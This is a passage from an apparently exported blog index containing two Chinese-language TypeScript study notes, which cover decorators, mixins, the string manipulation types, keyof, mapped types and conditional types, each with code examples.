中声明的空接口，除了在对象字面量的上下文类型中被识别之外，该接口的行为类似于任何空接口。 type ObjectDescriptor&lt;D, M&gt; = { data?: D; methods?: M &amp; ThisType&lt;D &amp; M&gt;; // methods方法中'this'类型是D &amp; M }; function makeObject&lt;D, M&gt;(desc: ObjectDescriptor&lt;D, M&gt;): D &amp; M { let data: object = desc.data || {}; let methods: object = desc.methods || {}; return { ...data, ...methods } as D &amp; M; } let obj = makeObject({ data: { x: 0, y: 0 }, methods: { moveBy(dx: number, dy: number) { // this类型为{ x: number, y: number } &amp; { moveBy(dx: number, dy: number): number } this.x += dx; this.y += dy; }, }, }); obj.x = 10; obj.y = 20; obj.moveBy(5, 5); console.log(obj); // { x: 15, y: 25, moveBy: [Function: moveBy] } 内部字符串操作类型 为了帮助进行字符串操作，TypeScript 包含一组可用于字符串操作的类型。这些类型内置于编译器中以提高性能，并且无法在 TypeScript 附带的 .d.ts 文件中找到。 Uppercase Uppercase&lt;StringType&gt; 将字符串中的每个字符转换为大写版本。 type Greeting = &quot;Hello, world&quot; type ShoutyGreeting = Uppercase&lt;Greeting&gt; // type ShoutyGreeting = &quot;HELLO, WORLD&quot; type ASCIICacheKey&lt;Str extends string&gt; = `ID-${Uppercase&lt;Str&gt;}` type MainID = ASCIICacheKey&lt;&quot;my_app&quot;&gt; // type MainID = &quot;ID-MY_APP&quot; Lowercase Lowercase&lt;StringType&gt; 将字符串中的每个字符转换为等效的小写字母。 type Greeting = &quot;Hello, world&quot; type QuietGreeting = Lowercase&lt;Greeting&gt; // type QuietGreeting = &quot;hello, world&quot; type ASCIICacheKey&lt;Str extends string&gt; = `id-${Lowercase&lt;Str&gt;}` type MainID = ASCIICacheKey&lt;&quot;MY_APP&quot;&gt; // type MainID = &quot;id-my_app&quot; Capitalize Capitalize&lt;StringType&gt; 将字符串中的第一个字符转换为等效的大写字母。 type LowercaseGreeting = &quot;hello, world&quot;; type Greeting = Capitalize&lt;LowercaseGreeting&gt;; // type Greeting = &quot;Hello, world&quot; Uncapitalize Uncapitalize&lt;StringType&gt; 将字符串中的第一个字符转换为等效的小写字母。 type UppercaseGreeting = &quot;HELLO WORLD&quot;; type UncomfortableGreeting = Uncapitalize&lt;UppercaseGreeting&gt;; // type UncomfortableGreeting = &quot;hELLO WORLD&quot; 装饰器 自从 ES2015 引入 class，当我们需要在多个不同的类之间共享或者扩展一些方法或行为的时候，代码会变得错综复杂。 装饰器是一种特殊类型的声明，它能够附加到类声明、方法、访问符、属性、类方法的参数上，以达到扩展类的行为。 装饰器使用 @expression 形式，expression 表达式求值后必须为一个函数，它会在运行时被调用，它接收三个参数 target、 name 和 descriptor ，然后可选性的返回被装饰之后的 descriptor 对象。 装饰器工厂 装饰器工厂只是一个函数，它返回装饰器将在运行时调用的表达式。通过装饰器工厂方法，可以额外传参，普通装饰器无法传参。 function log(param: string) { return function(target: any, name: string, descriptor: PropertyDescriptor) { console.log('target:', target); console.log('name:', name); console.log('descriptor:', descriptor); console.log('param:', param); } } class Employee { @log('with param') routine() { console.log('Daily routine'); } } const e = new Employee(); e.routine(); 装饰器组合 多个装饰器可以同时应用到一个声明上，它们可以书写在同一行上： @f @g x 也可以书写在多行上： @f @g x 当多个装饰器应用在一个声明上时会进行如下步骤的操作： 由上至下依次对装饰器表达式求值。 求值的结果会被当作函数，由下至上依次调用。 function first() { console.log(&quot;first(): factory evaluated&quot;); return function(target: any, propertyKey: string, descriptor: PropertyDescriptor) { console.log(&quot;first(): called&quot;); }; } function second() { console.log(&quot;second(): factory evaluated&quot;); return function(target: any, propertyKey: string, descriptor: PropertyDescriptor) { console.log(&quot;second(): called&quot;); }; } class ExampleClass { @first() @second() method() { } } 这会将以下输出打印到控制台： first(): factory evaluated second(): factory evaluated second(): called first(): called 类装饰器 通过类装饰器扩展类的属性和方法，类装饰器表达式会在运行时当作函数被调用，装饰类的构造函数作为其唯一的参数。 如果类装饰器返回一个值，它将用提供的构造函数替换类声明。如果你选择返回一个新的构造函数，则必须注意维护原始 prototype，在运行时应用装饰器的逻辑不会为你做这件事。 下面一个示例，说明了如何覆盖构造函数以设置新的默认值。 function reportableClassDecorator&lt;T extends { new (...args: any[]): {} }&gt;(constructor: T) { return class extends constructor { reportingURL = &quot;http://www...&quot;; // 函数重载 meeting() { console.log('重载：Daily meeting!') } }; } @reportableClassDecorator class BugReport { type = &quot;report&quot;; title: string; constructor(t: string) { this.title = t; } meeting() { console.log('Every Monday!') } } const bug = new BugReport(&quot;Needs dark mode&quot;); console.log(bug.title); console.log(bug.type); // 装饰器不会更改TypeScript类型，因此类型系统不知道新属性reportingURL // bug.reportingURL; // Property 'reportingURL' does not exist on type 'BugReport'. console.log(bug); bug.meeting(); // 重载：Daily meeting! 方法装饰器 方法装饰器的表达式会在运行时当作函数被调用，不能用于声明文件、重载或任何其他环境上下文（例如在 declare 类中）。具有以下三个参数： target: 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。 name: 成员的名字。 descriptor: 成员的属性描述符。 如果你熟悉 Object.defineProperty，你会立刻发现这正是 Object.defineProperty 的三个参数。比如通过装饰器完成一个方法只读功能，其实就是修改数据描述符中的 writable 的值 ： function readonly(value: boolean = true) { return function(target: any, name: string, descriptor: PropertyDescriptor) { descriptor.writable = !value; }; } class Employee { @readonly() salary() { console.log('这是个秘密'); } } const e = new Employee(); e.salary = () =&gt; { // 不可写 console.log('change'); }; e.salary(); // 这是个秘密 访问器装饰器 访问器装饰器应用于访问器的属性描述符，可用于观察、修改或替换访问器的定义。访问器装饰器不能在声明文件或任何其他环境上下文（例如在 declare 类中）中使用，不允许同时装饰单个成员的 get 和 set 访问器。访问器装饰器的表达式将在运行时作为函数调用，参数与方法装饰器相同。 function configurable(value: boolean) { return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) { descriptor.configurable = value; }; } class Point { private _x: number; private _y: number; constructor(x: number, y: number) { this._x = x; this._y = y; } @configurable(false) get x() { return this._x; } @configurable(false) get y() { return this._y; } } 属性装饰器 属性装饰器的表达式将在运行时作为函数调用，参数与方法装饰器相同，但它的第三个参数为 undefined，因为此刻的属性还没有初始化，所以没有配置项。属性装饰器不能在声明文件或任何其他环境上下文（例如在 declare 类中）中使用。 例如我们可以使用属性装饰器来记录有关属性的元数据： import &quot;reflect-metadata&quot;; const formatMetadataKey = Symbol(&quot;format&quot;); function format(formatString: string) { return Reflect.metadata(formatMetadataKey, formatString); } function getFormat(target: any, propertyKey: string) { return Reflect.getMetadata(formatMetadataKey, target, propertyKey); } class Greeter { @format(&quot;Hello, %s&quot;) greeting: string; constructor(message: string) { this.greeting = message; } greet() { let formatString = getFormat(this, &quot;greeting&quot;); return formatString.replace(&quot;%s&quot;, this.greeting); } } console.log(new Greeter('abc').greet()); // Hello, abc 我们使用函数声明定义了 @format 装饰器和 getFormat 函数，这里的 @format(&quot;Hello, %s&quot;) 装饰器是一个装饰器工厂。当调用 @format(&quot;Hello, %s&quot;) 时，它使用 reflect-metadata 库中的 Reflect.metadata 函数为属性添加元数据条目。当调用 getFormat 时，它会读取元数据值。 参数装饰器 参数装饰器应用于类构造函数或方法声明的函数，只能用于观察参数是否已在方法上声明。参数装饰器不能在声明文件、重载或任何其他环境上下文（例如在 declare 类中）中使用。 参数装饰器的表达式将在运行时作为函数调用，具有以下三个参数： 静态成员的类的构造函数，或实例成员的类的原型。 成员的名称。 参数在函数参数列表中的序号索引。 下面示例，@required 装饰器添加一个元数据条目，将参数标记为必需。然后 @validate 装饰器将现有的 greet 方法包装在一个函数中，该函数在调用原始方法之前验证参数。 import &quot;reflect-metadata&quot;; const requiredMetadataKey = Symbol(&quot;required&quot;); function required(target: Object, propertyKey: string | symbol, parameterIndex: number) { let existingRequiredParameters: number[] = Reflect.getOwnMetadata(requiredMetadataKey, target, propertyKey) || []; existingRequiredParameters.push(parameterIndex); Reflect.defineMetadata(requiredMetadataKey, existingRequiredParameters, target, propertyKey); } function validate(target: any, propertyName: string, descriptor: TypedPropertyDescriptor&lt;Function&gt;) { let method = descriptor.value!; descriptor.value = function() { let requiredParameters: number[] = Reflect.getOwnMetadata(requiredMetadataKey, target, propertyName); if (requiredParameters) { for (let parameterIndex of requiredParameters) { if (parameterIndex &gt;= arguments.length || arguments[parameterIndex] === undefined) { throw new Error(&quot;Missing required argument.&quot;); } } } return method.apply(this, arguments); }; } class BugReport { type = &quot;report&quot;; title: string; constructor(t: string) { this.title = t; } @validate print(@required verbose?: boolean) { if (verbose) { return `type: ${this.type}\\ntitle: ${this.title}`; } else { return this.title; } } } console.log(new BugReport('abc').print(false)); // abc 元数据 TypeScript 包括对为具有装饰器的声明发出某些类型的元数据的实验性支持。要启用此实验性支持，您必须在命令行或 tsconfig.json 中设置 emitDecoratorMetadata 编译器选项： tsc --target ES5 --experimentalDecorators --emitDecoratorMetadata { &quot;compilerOptions&quot;: { &quot;target&quot;: &quot;ES5&quot;, &quot;experimentalDecorators&quot;: true, &quot;emitDecoratorMetadata&quot;: true } } emitDecoratorMetadata 标志启用对与模块 reflect-metadata 一起使用的装饰器的发射类型元数据的实验性支持。启用后，只要导入了 reflect-metadata 库，就会在运行时公开额外的设计时类型信息。 // @emitDecoratorMetadata // @experimentalDecorators // @strictPropertyInitialization: false import &quot;reflect-metadata&quot;; class Point { constructor(public x: number, public y: number) { } } class Line { private _start: Point; private _end: Point; @validate set start(value: Point) { this._start = value; } get start() { return this._start; } @validate set end(value: Point) { this._end = value; } get end() { return this._end; } } function validate&lt;T&gt;(target: any, propertyKey: string, descriptor: TypedPropertyDescriptor&lt;T&gt;) { let set = descriptor.set!; descriptor.set = function(value: T) { let type = Reflect.getMetadata(&quot;design:type&quot;, target, propertyKey); if (!(value instanceof type)) { throw new TypeError(`Invalid type, got ${typeof value} not ${type.name}.`); } set.call(this, value); }; } const line = new Line(); line.start = new Point(0, 0); // @ts-ignore line.end = {}; // Invalid type, got object not Point. 装饰器执行顺序 对于如何应用应用于类内部各种声明的装饰器，有一个明确定义的顺序： 对每个实例成员应用属性装饰器、访问器、参数装饰器、方法。 对每个静态成员应用属性装饰器、访问器、参数装饰器、方法。 构造方法参数装饰器。 类装饰器。 function extension(params: string) { return function(target: any) { console.log(params); } } function method(params: string) { return function(target: any, name: string, descriptor: PropertyDescriptor) { console.log(params); } } function attribute(params: string) { return function(target: any, name: string) { console.log(params); } } function argument(params: string) { return function(target: any, name: string, index: number) { console.log(params, index); } } @extension('类装饰器') class Employee { constructor(@argument('构造方法参数装饰器') n: string) { this.name = n; } @attribute('静态属性装饰器') static id: number; @attribute('属性装饰器') name!: string; @method('set 方法装饰器') set age(@argument('set 方法参数装饰器') n: number){} @method('静态方法装饰器') static work(@argument('静态方法参数装饰器') name: string, @argument('静态方法参数装饰器') department: string) {} @method('方法装饰器') salary(@argument('参数装饰器') name: string, @argument('参数装饰器') department: string) {} } 打印顺序为： 属性装饰器 set 方法参数装饰器 0 set 方法装饰器 参数装饰器 1 参数装饰器 0 方法装饰器 静态属性装饰器 静态方法参数装饰器 1 静态方法参数装饰器 0 静态方法装饰器 构造方法参数装饰器 0 类装饰器 混入(Mixins) 在 TypeScript 中，implements 只会继承属性的类型，而不会继承实际的逻辑，所以需要根据不同的功能定义多个可复用的类，将它们作为 mixins。 因为 extends 只支持继承一个父类，我们可以通过 implements 来连接多个 mixins，并且使用原型链将父类的方法实现复制到子类。 这就像组件拼合一样，由一堆细粒度的 mixins 快速搭建起一个功能强大的类。 // @strict: false // Each mixin is a traditional ES class class Jumpable { jump(this) { this.x++; } } class Duckable { duck(this) { this.y--; } } // 在基类上实现期望的 mixins // class Sprite implements Jumpable, Duckable { // x = 0; // y = 0; // jump: () =&gt; void; // duck: () =&gt; void; // } // 或创建一个与基类同名的接口，合并期望的 mixins class Sprite { x = 0; y = 0; } interface Sprite extends Jumpable, Duckable {} // 第一个参数是要混合的主体，第二个参数是要混入的构造函数数组，主要逻辑就是把原型链上面的方法拷贝到要混合的主体上面 function applyMixins(derivedCtor: any, constructors: any[]) { constructors.forEach((baseCtor) =&gt; { Object.getOwnPropertyNames(baseCtor.prototype).forEach((name) =&gt; { Object.defineProperty( derivedCtor.prototype, name, Object.getOwnPropertyDescriptor(baseCtor.prototype, name) || Object.create(null) ); }); }); } // 在运行时通过 JS 将 mixins 应用到基类中 applyMixins(Sprite, [Jumpable, Duckable]); let player = new Sprite(); player.jump(); player.duck(); console.log(player.x, player.y); // 1, -1 没有使用 extends 而是使用了 implements，把类当成了接口，仅使用它们的类型而非其实现。我们也没有在类里面实现接口，因为这是我们在用 mixin 时想避免的。 为将要 mixin 进来的属性方法创建出占位属性，这告诉编译器这些成员在运行时是可用的，这样就能使用 mixin 带来的便利，虽说需要提前定义一些占位属性。 最后，创建了一个帮助函数，帮我们做混入操作。它会遍历 mixins 上的所有属性，并复制到目标上去，把之前的占位属性替换成真正的实现代码。 ","link":"https://zkrisj.github.io/post/typescript-gong-ju-lei-xing-zhuang-shi-qi-hun-ru-mixins-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 索引类型、映射类型、条件类型 ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 keyof 用于从对象类型中生成其键的字符串或数字字面量的联合类型。 type Point = { x: number; y: number }; type P = keyof Point; // 相当于 type P = 'x' | 'y' 如果对象类型具有字符串或数字索引签名，则 keyof 将返回这些类型： type Arrayish = { [n: number]: unknown }; type A = keyof Arrayish; // 相当于 type A = number type Mapish = { [k: string]: boolean }; type M = keyof Mapish; // 相当于 type M = string | number M 是类型 string | number，因为 JavaScript 对象键总是被强制转换为字符串，所以 obj[0] 总是与 obj[&quot;0&quot;] 相同。 keyof 还可以与索引签名一起使用，以提取索引类型。 type StringMap = { [key: string]: unknown }; // 这里 keyof StringMap 解析为 string | number function createStringPair(property: keyof StringMap, value: string): StringMap { return { [property]: value }; } 索引访问类型 我们可以使用索引访问类型来查找一种类型的特定属性： type Person = { age: number; name: string; alive: boolean }; type Age = Person[&quot;age&quot;]; // type Age = number type I1 = Person[&quot;age&quot; | &quot;name&quot;]; // type I1 = string | number type I2 = Person[keyof Person]; // type I2 = string | number | boolean type AliveOrName = &quot;alive&quot; | &quot;name&quot;; type I3 = Person[AliveOrName]; // type I3 = string | boolean 使用 number 来获取数组元素的类型，然后将其与 typeof 结合起来，可以方便地捕获数组字面量的元素类型。 const MyArray = [ { name: &quot;Alice&quot;, age: 15 }, { name: &quot;Bob&quot;, age: 23 }, { name: &quot;Eve&quot;, age: 38 }, ]; type Person = typeof MyArray[number]; // type Person = { // name: string; // age: number; // } type Age = typeof MyArray[number][&quot;age&quot;]; // type Age = number // Or type Age2 = Person[&quot;age&quot;]; // type Age2 = number 索引时只能使用类型，这意味着不能使用常量来生成变量引用： const key = &quot;age&quot;; type Age = Person[key]; // Type 'key' cannot be used as an index type. 但可以使用类型别名进行类似的类型重构： type key = &quot;age&quot;; type Age = Person[key]; // type Age = number 索引签名 有时你并不能提前知道类型属性的所有名称，但你确实知道值的类型。在这些情况下，可以使用索引签名来描述可能值的类型，例如： function getStringArray(): StringArray { return {} as StringArray; } interface StringArray { [index: number]: string; } const myArray: StringArray = getStringArray(); const secondItem = myArray[1]; // const secondItem: string 索引签名属性只允许使用某些类型：string、number、symbol、模板字符串以及仅包含这些的联合类型。 可以支持两种类型的索引器，但从数字索引器返回的类型必须是从字符串索引器返回的类型的子类型。这是因为当使用数字进行索引时，JavaScript 实际上会在索引到对象之前将其转换为字符串。这意味着使用 100（数字）进行索引与使用 &quot;100&quot;（字符串）进行索引是一样的，因此两者需要保持一致。 class Animal { name: string; } class Dog extends Animal { breed: string; } interface NotOkay { [x: number]: Animal; // 'number' index type 'Animal' is not assignable to 'string' index type 'Dog'. [x: string]: Dog; } 虽然字符串索引签名是描述“字典”模式的强大方式，但它还强制所有属性与其返回类型相匹配，因为字符串索引声明 obj.property 也可写作 obj[&quot;property&quot;]。在下面的示例中，name 的类型与字符串索引的类型不匹配，所以类型检查器报错： interface NumberDictionary { [index: string]: number; length: number; // 可以，length是number类型 name: string // 错误，name的类型与索引类型返回值的类型不匹配 } 但是，如果索引签名是属性类型的联合，则可以接受不同类型的属性： interface NumberOrStringDictionary { [index: string]: number | string; length: number; // ok name: string; // ok } 索引类型 使用索引类型，编译器就能够检查使用了动态属性名的代码。例如，一个常见的 JavaScript 场景是从对象中选取属性的子集。 function pluck(o, names) { return names.map(n =&gt; o[n]); } 在 TypeScript 中通过索引访问操作符 T[K] 和索引类型查询 keyof T 使用它： function pluck&lt;T, K extends keyof T&gt;(o: T, names: K[]): T[K][] { return names.map(n =&gt; o[n]); } interface Person { name: string; age: number; } let person: Person = { name: 'Jarid', age: 35 }; let strings: string[] = pluck(person, ['name']); // string[] pluck(person, ['age', 'unknown']); // error, 'unknown' is not in 'name' | 'age' 这里编译器会检查 name 是否是 Person 的一个属性。类型语法也反映了表达式语法，所以 person['name'] 具有类型 Person['name']： let personName: Person['name'] = person['name']; // string 像索引类型查询一样，可以在普通的上下文里使用索引访问 T[K]，这正是它的强大所在。 function getProperty&lt;T, K extends keyof T&gt;(o: T, name: K): T[K] { return o[name]; // o: T, name: K所以o[name]: T[K] } 当返回 T[K] 的结果时，编译器会实例化键的真实类型，因此 getProperty 的返回值类型会随着传入的属性名而改变。 let name: string = getProperty(person, 'name'); let age: number = getProperty(person, 'age'); let unknown = getProperty(person, 'unknown'); // error, 'unknown' is not in 'name' | 'age' 索引类型和索引签名 keyof 和 T[K] 可以与索引签名交互。索引签名参数类型必须是“字符串”或“数字”。如果你有一个带有字符串索引签名的类型，则 keyof T 将为 string | number（不仅仅是字符串，因为在 JavaScript 中，可以同时使用字符串 object[&quot;42&quot;] 或数字 object[42] 访问对象属性），而 T[&quot;someString&quot;] 是索引签名的类型。 interface Dictionary&lt;T&gt; { [key: string]: T; } let keys: keyof Dictionary&lt;number&gt;; // let keys: string | number let value: Dictionary&lt;number&gt;[&quot;foo&quot;]; // let value: number 一个带有数字索引签名的类型，keyof T 将只是数字。 interface Dictionary2&lt;T&gt; { [key: number]: T; } let keys2: keyof Dictionary2&lt;number&gt;; // let keys2: number let numberValue: Dictionary2&lt;number&gt;[42]; // let numberValue: number let value2: Dictionary2&lt;number&gt;[&quot;foo&quot;]; // Property 'foo' does not exist on type 'Dictionary2&lt;number&gt;'. 映射类型 有时一种类型需要基于另一种类型的属性列表。 让我们看一下最简单的映射类型及其部分： type Keys = &quot;option1&quot; | &quot;option2&quot;; type Flags = { [K in Keys]: boolean }; 语法类似于带有 for .. in 内部索引签名的语法。分为三部分： 类型变量 K，它会依次绑定到每个属性。 字符串字面量联合的 Keys，它包含了要迭代的属性名的集合。 属性的结果类型。 Keys 是硬编码的的属性名列表，并且属性类型永远是 boolean，因此这个映射类型等同于： type Flags = { option1: boolean; option2: boolean; }; 一个常见的任务是将一个已知的类型每个属性设为可选。 interface PersonSubset { name?: string; age?: number; } 或者我们可能想要一个只读版本： interface PersonReadonly { readonly name: string; readonly age: number; } 这种情况在 JavaScript 中经常发生，以至于 TypeScript 提供了一种基于旧类型创建新类型的方法——映射类型。在映射类型中，新类型以相同的方式转换旧类型中的每个属性。例如，你可以令每个属性成为 readonly 类型或可选的。 type Partial&lt;T&gt; = { [P in keyof T]?: T[P]; }; type Readonly&lt;T&gt; = { readonly [P in keyof T]: T[P]; }; type Person = { name: string; age: number; }; type PersonPartial = Partial&lt;Person&gt;; // type PersonPartial = { // name?: string | undefined; // age?: number | undefined; // } type ReadonlyPerson = Readonly&lt;Person&gt;; // type ReadonlyPerson = { // readonly name: string; // readonly age: number; // } 映射类型描述的是类型而不是成员。如果要添加成员，可以使用交叉类型： type PartialWithNewMember&lt;T&gt; = { [P in keyof T]?: T[P]; } &amp; { newMember: boolean } type WrongPartialWithNewMember&lt;T&gt; = { [P in keyof T]?: T[P]; newMember: boolean; // A mapped type may not declare properties or methods. } 实际应用中，可能不同于上面的 Readonly 或 Partial。它们会基于一些现有的类型，按照一定的方式转换属性字段。这就是 keyof 索引访问类型的用武之地： type Person = { name: string; age: number; }; // 基于一些已存在的类型，且按照一定的方式转换字段 type NullablePerson = { [P in keyof Person]: Person[P] | null }; // 相当于 // type NullablePerson = { // name: string | null; // age: number | null; // } type PartialPerson = { [P in keyof Person]?: Person[P] }; // 相当于 // type PartialPerson = { // name?: string | undefined; // age?: number | undefined; // } 但它更有用的地方是可以有一些通用版本。 // 通用版本 type Nullable&lt;T&gt; = { [P in keyof T]: T[P] | null }; type MyPartial&lt;T&gt; = { [P in keyof T]?: T[P] }; 上述转换中，属性列表是 keyof T，且结果类型是 T[P] 的变体，所以它们是同态的，即映射只作用于 T 的属性。而且，编译器知道在添加任何新属性之前可以拷贝所有存在的属性修饰符，例如 Person.name 是只读的，Partial&lt;Person&gt;.name 则将是只读的和可选的。 要注意的是，keyof any 表示可用作对象索引的任何类型，即 keyof any 等于 string | number | symbol。 由于 Readonly 和 Partial 非常有用，所以它们和 Pick、Record 被一起包含进了 TypeScript 的标准库中。 非同态类型本质上是在创建新属性，因此它们无法从任何地方复制属性修饰符。Readonly、Partial 和 Pick 是同态的，但 Record 不是，因为 Record 并不需要输入类型来拷贝属性： type ThreeStringProps = Record&lt;&quot;prop1&quot; | &quot;prop2&quot; | &quot;prop3&quot;, string&gt;; 下面是另一个例子， T[P] 被包装在 Proxy&lt;T&gt; 代理中： type Proxy&lt;T&gt; = { get(): T; set(value: T): void; }; type Proxify&lt;T&gt; = { [P in keyof T]: Proxy&lt;T[P]&gt;; }; function proxify&lt;T&gt;(o: T): Proxify&lt;T&gt; { return {} as Proxify&lt;T&gt;; } let props = { rooms: 4 }; let proxyProps = proxify(props); // 相当于 // let proxyProps: Proxify&lt;{ // rooms: number; // }&gt; 了解了如何包装一个类型的属性，接下来就是如何拆包：从映射类型推断。 function unproxify&lt;T&gt;(t: Proxify&lt;T&gt;): T { let result = {} as T; for (const k in t) { result[k] = t[k].get(); } return result; } let props = { rooms: 4 }; let proxyProps = proxify(props); // let proxyProps: Proxify&lt;{ // rooms: number; // }&gt; let originalProps = unproxify(proxyProps); // let originalProps: { // rooms: number; // } 注意这个拆包推断只适用于同态的映射类型。如果映射类型不是同态的，那么需要给拆包函数提供一个显式类型参数。 映射类型可以建立在索引签名的语法之上，声明未声明的属性类型。 type OptionsFlags&lt;Type&gt; = { [Property in keyof Type]: boolean; }; type FeatureFlags = { darkMode: () =&gt; void; newUserProfile: () =&gt; void; }; type FeatureOptions = OptionsFlags&lt;FeatureFlags&gt;; // type FeatureOptions = { // darkMode: boolean; // newUserProfile: boolean; // } 在此示例中，OptionsFlags 将从类型中获取所有属性类型并将它们更改为布尔。 有两个附加的修饰符可以在映射期间应用：readonly 和 ? 它们分别影响可变性和选择性。还可以通过添加 - 或 + 前缀来删除或添加这些附加的修饰符。如果不添加前缀，则假定为 +。 // Removes 'readonly' attributes from a type's properties type CreateMutable&lt;Type&gt; = { -readonly [Property in keyof Type]: Type[Property]; }; type LockedAccount = { readonly id: string; readonly name: string; }; type UnlockedAccount = CreateMutable&lt;LockedAccount&gt;; // type UnlockedAccount = { // id: string; // name: string; // } // Removes 'optional' attributes from a type's properties type Concrete&lt;Type&gt; = { [Property in keyof Type]-?: Type[Property]; }; type MaybeUser = { id: string; name?: string; age?: number; }; type User = Concrete&lt;MaybeUser&gt;; // type User = { // id: string; // name: string; // age: number; // } 在 TypeScript 4.1 及更高版本中，可以在映射类型中使用 as 子句重新映射映射类型中的键，例如可以利用模板字符串类型等功能，从以前的属性名称创建新的属性名称： type Getters&lt;Type&gt; = { [Property in keyof Type as `get${Capitalize&lt;string &amp; Property&gt;}`]: () =&gt; Type[Property] }; interface Person { name: string; age: number; location: string; } type LazyPerson = Getters&lt;Person&gt;; // type LazyPerson = { // getName: () =&gt; string; // getAge: () =&gt; number; // getLocation: () =&gt; string; // } 可以通过条件类型来过滤关键字属性： // 删除kind属性 type RemoveKindField&lt;Type&gt; = { [Property in keyof Type as Exclude&lt;Property, &quot;kind&quot;&gt;]: Type[Property] }; interface Circle { kind: &quot;circle&quot;; radius: number; } type KindlessCircle = RemoveKindField&lt;Circle&gt;; // type KindlessCircle = { // radius: number; // } 不仅仅是 string | number | symbol，可以映射任何类型的联合： type EventConfig&lt;Events extends { kind: string }&gt; = { [E in Events as E[&quot;kind&quot;]]: (event: E) =&gt; void; } type SquareEvent = { kind: &quot;square&quot;, x: number, y: number }; type CircleEvent = { kind: &quot;circle&quot;, radius: number }; type Config = EventConfig&lt;SquareEvent | CircleEvent&gt; // type Config = { // square: (event: SquareEvent) =&gt; void; // circle: (event: CircleEvent) =&gt; void; // } 条件类型 条件类型就是在初始状态并不直接确定具体类型，而是通过一定的类型运算得到最终的变量类型。条件类型的形式为 T extends U ? X : Y，类似于 JavaScript 中的条件表达式。 type TypeName&lt;T&gt; = T extends string ? &quot;string&quot; : T extends number ? &quot;number&quot; : T extends boolean ? &quot;boolean&quot; : T extends undefined ? &quot;undefined&quot; : T extends Function ? &quot;function&quot; : &quot;object&quot;; type T0 = TypeName&lt;string&gt;; // type T0 = &quot;string&quot; type T1 = TypeName&lt;&quot;a&quot;&gt;; // type T1 = &quot;string&quot; type T2 = TypeName&lt;true&gt;; // type T2 = &quot;boolean&quot; type T3 = TypeName&lt;() =&gt; void&gt;; // type T3 = &quot;function&quot; type T4 = TypeName&lt;string[]&gt;; // type T4 = &quot;object&quot; type T5 = TypeName&lt;string | (() =&gt; void)&gt;; // type T5 = &quot;string&quot; | &quot;function&quot; type T6 = TypeName&lt;string | string[] | undefined&gt;; // type T6 = &quot;string&quot; | &quot;undefined&quot; | &quot;object&quot; type T7 = TypeName&lt;string[] | number[]&gt;; // type T7 = &quot;object&quot; 条件类型的强大之处在于将它们与泛型一起使用，例如一个基于输入类型进行选择的 createLabel 函数： interface IdLabel { id: number /* 一些字段 */; } interface NameLabel { name: string /* 其它字段 */; } function createLabel(id: number): IdLabel; function createLabel(name: string): NameLabel; function createLabel(nameOrId: string | number): IdLabel | NameLabel; function createLabel(nameOrId: string | number): IdLabel | NameLabel { throw &quot;unimplemented&quot;; } 如果一个库必须在其 API 中一遍又一遍地做出相同类型的选择，这将变得很麻烦。 我们必须创建三个重载：一个用于确定类型的每种情况（一个用于 string，一个用于 number），一个用于最通用的情况（采用 string | number）。对于每个 createLabel 可以处理的新类型，重载的数量呈指数增长。 相反，我们可以将该逻辑转换为条件类型： type NameOrId&lt;T extends number | string&gt; = T extends number ? IdLabel : NameLabel; 然后，我们可以使用该条件类型将重载简化为没有重载的单个函数。 function createLabel&lt;T extends number | string&gt;(idOrName: T): NameOrId&lt;T&gt; { throw &quot;unimplemented&quot;; } let a = createLabel(&quot;typescript&quot;); // let a: NameLabel let b = createLabel(2.8); // let b: IdLabel let c = createLabel(Math.random() ? &quot;hello&quot; : 42); // let c: NameLabel | IdLabel 通常，条件类型的检查将为我们提供一些新信息。就像使用类型守卫缩小范围可以给我们提供更具体的类型一样，条件类型的 true 分支将根据我们检查的类型进一步约束泛型。 type MessageOf&lt;T&gt; = T[&quot;message&quot;]; // Type '&quot;message&quot;' cannot be used to index type 'T'. 在本例中，TypeScript 产生错误是因为不知道 T 有一个名为 message 的属性。我们可以约束 T，TypeScript 也不会再报错了： type MessageOf&lt;T extends { message: unknown }&gt; = T[&quot;message&quot;]; interface Email { message: string; } type EmailMessageContents = MessageOf&lt;Email&gt;; // type EmailMessageContents = string 如果我们希望 MessageOf 接受任何类型，并且在 message 属性不可用的情况下默认为 never 之类的类型，我们应该怎么做呢？ 我们可以通过将约束移动到外面，并引入条件类型来实现这一点： type MessageOf&lt;T&gt; = T extends { message: unknown } ? T[&quot;message&quot;] : never; interface Email { message: string; } interface Dog { bark(): void; } type EmailMessageContents = MessageOf&lt;Email&gt;; // type EmailMessageContents = string type DogMessageContents = MessageOf&lt;Dog&gt;; // type DogMessageContents = never 在 true 分支中，TypeScript 知道 T 将有一个 message 属性。 当传入的类型参数为联合类型时，他们会被分配类型。 type ToArray&lt;Type&gt; = Type extends any ? Type[] : never; type StrArrOrNumArr = ToArray&lt;string | number&gt;; // type StrArrOrNumArr = string[] | number[] 通常，分布性是所需的行为。要避免这种行为，可以用方括号括起 extends 关键字的两边。 type ToArrayNonDist&lt;Type&gt; = [Type] extends [any] ? Type[] : never; // 'StrArrOrNumArr'不再是联合 type StrArrOrNumArr2 = ToArrayNonDist&lt;string | number&gt;; // type StrArrOrNumArr2 = (string | number)[] 